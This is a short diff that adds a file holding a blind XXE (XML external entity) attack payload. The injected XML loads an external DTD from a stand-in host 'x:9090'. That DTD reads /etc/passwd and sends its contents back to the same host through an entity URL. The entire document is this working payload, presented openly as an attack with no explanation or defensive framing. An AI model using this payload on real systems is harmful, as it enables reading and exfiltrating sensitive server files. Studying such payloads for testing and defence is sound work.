@@ -1,0 +1,9 @@
+	#injected xml:
+	<?xml version="1.0"?>
+	<!DOCTYPE foo SYSTEM "http://x:9090/test.dtd">
+	<foo>&e1;</foo>
+
+	# test.dtd file in attacker's server:
+	<!ENTITY % p1 SYSTEM "file:///etc/passwd">
+	<!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://x:9090/BLAH?%p1;'>">
+	%p2;
